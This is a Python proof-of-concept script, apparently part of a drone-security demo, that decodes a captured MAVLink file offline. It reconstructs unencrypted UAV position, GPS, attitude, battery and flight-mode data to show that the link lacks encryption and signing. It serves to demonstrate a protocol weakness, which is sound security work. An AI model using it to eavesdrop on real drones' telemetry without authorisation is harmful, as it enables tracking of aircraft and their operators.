#!/usr/bin/env python3
"""PoC 02 - Step 2: decode the MAVLink .bin capture into readable text.

Reads the raw-frame file that `eavesdrop.py` saved and reconstructs the
cleartext telemetry (position, GPS, attitude, battery, mode) without any key —
evidence that the link is not encrypted.
Usage: python attacks/demos/02-eavesdrop/decode.py [--file capture.bin]
"""
import argparse
import collections
import math
import os
from pymavlink import mavutil

CAP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "capture.bin")


def rule(t): return "=" * 10 + " " + t + " " + "=" * max(0, 58 - len(t))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--file", default=CAP)
    ap.add_argument("--dump", action="store_true", help="dump every decoded frame")
    a = ap.parse_args()

    if not os.path.exists(a.file):
        print(f"[-] {a.file} does not exist. Run first: python attacks/demos/02-eavesdrop/eavesdrop.py")
        return 1

    data = open(a.file, "rb").read()
    mav = mavutil.mavlink.MAVLink(None)
    mav.robust_parsing = True
    msgs = []
    # byte-by-byte parsing (robust across pymavlink versions)
    for byte in data:
        try:
            m = mav.parse_char(bytes([byte]))
        except Exception:
            m = None
        if m is not None and m.get_type() != "BAD_DATA":
            msgs.append(m)

    print(rule("PWNUAV DECODE — cleartext MAVLink capture"))
    print(f"file    : {a.file}")
    print(f"size    : {len(data):,} bytes   MAVLink frames decoded: {len(msgs)}")
    print("key     : NONE — the payload travels unencrypted (that's why it decodes)\n")

    counts = collections.Counter(m.get_type() for m in msgs)
    print("[message inventory]")
    for name, c in sorted(counts.items()):
        print(f"  {name:<22} x{c}")
    print()

    last = {}
    for m in msgs:
        last[m.get_type()] = m

    print("[reconstructed flight picture (cleartext)]")
    g = last.get("GLOBAL_POSITION_INT")
    if g:
        print(f"  position : lat {g.lat/1e7:.6f}  lon {g.lon/1e7:.6f}  alt {g.alt/1000:.1f} m")
        print(f"  velocity : vx {g.vx/100:.2f}  vy {g.vy/100:.2f}  vz {g.vz/100:.2f} m/s  hdg {g.hdg/100:.1f} deg")
    gr = last.get("GPS_RAW_INT")
    if gr:
        print(f"  gps      : fix {gr.fix_type}  sats {gr.satellites_visible}")
    at = last.get("ATTITUDE")
    if at:
        print(f"  attitude : roll {math.degrees(at.roll):.1f}  pitch {math.degrees(at.pitch):.1f}  yaw {math.degrees(at.yaw):.1f} deg")
    ss = last.get("SYS_STATUS")
    if ss:
        print(f"  battery  : {ss.voltage_battery/1000:.1f} V  {ss.current_battery/100:.1f} A  {ss.battery_remaining}%")
    hb = last.get("HEARTBEAT")
    if hb:
        try:
            state = mavutil.mavlink.enums['MAV_STATE'][hb.system_status].name
        except Exception:
            state = str(hb.system_status)
        print(f"  mode     : custom_mode {hb.custom_mode}  state {state}")
    print()

    if g:
        raw = bytes(g.get_msgbuf())
        print("[sample frame — raw GLOBAL_POSITION_INT from the .bin]")
        print("  " + raw.hex(" ").upper())
        print(f"  STX=0x{raw[0]:02X} (MAVLink2)  incompat_flags=0x{raw[2]:02X} -> "
              f"{'UNSIGNED' if raw[2] == 0 else 'signed'}\n")

    if a.dump:
        print("[full dump]")
        for m in msgs:
            print("  " + m.get_type() + ": " + str(m.to_dict()))

    print("[+] telemetry reconstructed OFFLINE from the .bin — no credential, no key.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
